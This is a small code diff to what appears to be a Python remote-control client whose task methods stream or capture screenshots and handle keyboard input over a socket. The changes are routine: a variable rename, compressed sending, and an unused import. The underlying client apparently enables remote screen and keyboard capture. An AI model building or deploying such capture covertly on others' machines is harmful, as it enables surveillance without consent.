@@ -1,3 +1,4 @@
+from tkinter import image_names
 from services.Socket import Socket
 import services.utils as utils
 import services.keyboard as keyboard
@@ -131,11 +132,11 @@ class Client(Socket, threading.Thread):
 
     # screen
     def task_screen_stream(self):
-        size = self.recv_obj()
-        self.send_obj(utils.take_screenshot(size))
+        image_size = self.recv_obj()
+        self.send_obj_comp(utils.take_screenshot(image_size))
 
     def task_screen_capture(self):
-        self.send_obj(utils.take_screenshot())
+        self.send_obj_comp(utils.take_screenshot())
 
     # keyboard
     def task_keyboard_start(self):
